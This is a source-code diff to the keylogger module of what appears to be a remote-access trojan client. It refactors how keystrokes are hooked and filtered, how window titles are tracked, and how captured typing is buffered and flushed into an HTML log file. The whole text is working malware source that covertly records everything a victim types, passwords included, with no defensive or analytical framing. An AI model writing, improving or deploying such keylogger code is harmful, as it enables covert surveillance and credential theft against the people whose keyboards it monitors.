@@ -14,8 +14,9 @@ namespace xClient.Core.Keylogger
     {
         #region GlobalMembers
         public static Logger Instance;
-        private StringBuilder _logFileBuffer;
+        private StringBuilder _logFileBuffer = new StringBuilder();
         private List<Keys> _pressedKeys = new List<Keys>();
+        private List<char> _pressedKeyChars = new List<char>();
         private IKeyboardMouseEvents _mEvents;
         private readonly System.Timers.Timer _timerFlush;
         private string _hWndLastTitle;
@@ -34,8 +35,6 @@ namespace xClient.Core.Keylogger
             _hWndLastTitle = string.Empty;
 
             WriteFile();
-
-            this._logFileBuffer = new StringBuilder();
 
             this._timerFlush = new System.Timers.Timer { Interval = flushInterval };
             this._timerFlush.Elapsed += this.timerFlush_Elapsed;
@@ -138,70 +137,58 @@ namespace xClient.Core.Keylogger
                     _logFileBuffer.Append(@"<p class=""h""><br><br>[<i>" + _hWndTitle + "</i>]</p><br>");
                 }
             }
-            // If modifier keys are still down, the key code provided will
-            // be recorded for flushing to the 
-            if (_pressedKeys.Contains(Keys.LControlKey)
-                || _pressedKeys.Contains(Keys.RControlKey)
-                || _pressedKeys.Contains(Keys.LMenu)
-                || _pressedKeys.Contains(Keys.RMenu)
-                || _pressedKeys.Contains(Keys.LWin)
-                || _pressedKeys.Contains(Keys.RWin))
-            {
-                if (!_pressedKeys.Contains(e.KeyCode)) //prevent multiple keypresses holding down a key
-                    _pressedKeys.Add(e.KeyCode);
-            }
-            else
-            {
-                if (!_pressedKeys.Contains(e.KeyCode))
-                    _pressedKeys.Add(e.KeyCode);
 
-                switch (e.KeyCode) //Process special keys and pass excluded keys to keypress event
+            switch (e.KeyCode) //Process special keys and ignore specific keys
+            {
+                //TODO: Add custom Key enumeration for control over naming keys we will display
+                case Keys.Enter:
+                    _logFileBuffer.Append(@"<p class=""h"">(ENTER)</p><br>");
+                    break;
+                case Keys.Space:
+                    _logFileBuffer.Append("&nbsp;");
+                    break;
+                case Keys.Back:
+                    _logFileBuffer.Append(@"<p class=""h"">(BACK)</p>");
+                    break;
+                case Keys.Delete:
+                    _logFileBuffer.Append(@"<p class=""h"">(DEL)</p>");
+                    break;
+                case Keys.Left:
+                case Keys.Right:
+                case Keys.Up:
+                case Keys.Down:
+                    _logFileBuffer.Append(@"<p class=""h"">(" + e.KeyCode.ToString() + ")</p>");
+                    break;
+                default:
                 {
-                    case Keys.Enter:
-                        _logFileBuffer.Append(@"<p class=""h"">(ENTER)</p><br>"); //this could be where the KeyloggerKeys enum would be handy
-                        break;
-                    case Keys.Space:
-                        _logFileBuffer.Append("&nbsp;");
-                        break;
-                    case Keys.Back:
-                        _logFileBuffer.Append(@"<p class=""h"">(BACK)</p>");
-                        break;
-                    case Keys.Delete:
-                        _logFileBuffer.Append(@"<p class=""h"">(DEL)</p>");
-                        break;
-                    case Keys.Left:
-                    case Keys.Right:
-                    case Keys.Up:
-                    case Keys.Down:
-                        _logFileBuffer.Append(@"<p class=""h"">(" + e.KeyCode.ToString() + ")</p>");
-                        break;
-                    default:
+                    // The keys below are excluded. If it is one of the keys below,
+                    // the KeyPress event will handle these characters. If the keys
+                    // are not any of those specified below, we can continue.
+                    if (!((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z)
+                    || (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.Divide)
+                    || (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
+                    || (e.KeyCode >= Keys.Oem1 && e.KeyCode <= Keys.OemClear
+                    || (e.KeyCode >= Keys.LShiftKey && e.KeyCode <= Keys.RShiftKey)
+                    || (e.KeyCode == Keys.CapsLock))))
                     {
-                        // The keys below are excluded. If it is one of the keys below,
-                        // the KeyPress event will handle these characters. If the keys
-                        // are not any of those specified below, we can continue.
-                        if (!((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z)
-                        || (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.Divide)
-                        || (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
-                        || (e.KeyCode >= Keys.Oem1 && e.KeyCode <= Keys.OemClear
-                        || (e.KeyCode >= Keys.LShiftKey && e.KeyCode <= Keys.RShiftKey)
-                        || (e.KeyCode == Keys.CapsLock))))
-                        {
-                            // The key was not part of the keys that we wish to filter, so
-                            // be sure to prevent a situation where multiple keys are pressed.
-                            if (!_pressedKeys.Contains(e.KeyCode))
-                                _pressedKeys.Add(e.KeyCode);
-                        }
-                        break;
+                        // The key was not part of the keys that we wish to filter, so
+                        // be sure to prevent a situation where multiple keys are pressed.
+                        if (!_pressedKeys.Contains(e.KeyCode))
+                            _pressedKeys.Add(e.KeyCode);
                     }
+                    break;
                 }
             }
         }
         
         private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
         {
-            //This method should be used to process all of our unicode characters
-            _logFileBuffer.Append(Filter(e.KeyChar));
+            if (!_pressedKeyChars.Contains(e.KeyChar))
+            {
+                //Process unicode characters
+                _pressedKeyChars.Add(e.KeyChar);
+                _logFileBuffer.Append(Filter(e.KeyChar));
+            }
         }
 
         private void OnKeyUp(object sender, KeyEventArgs e) //Called third
@@ -338,8 +325,10 @@ namespace xClient.Core.Keylogger
                         {
                             if (writeHeader)
                             {
-                                sw.WriteLine("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
-                                         DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br><br>");
+                                sw.WriteLine(
+                                    "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />" +
+                                    "<meta http-equiv='X-UA-Compatible' content='IE=edge'/>Log created on " +
+                                    DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br><br>");
 
                                 // Write out our coloring scheme that will be used by the elements
                                 // generated by the logger, and display paragaphs without line breaks
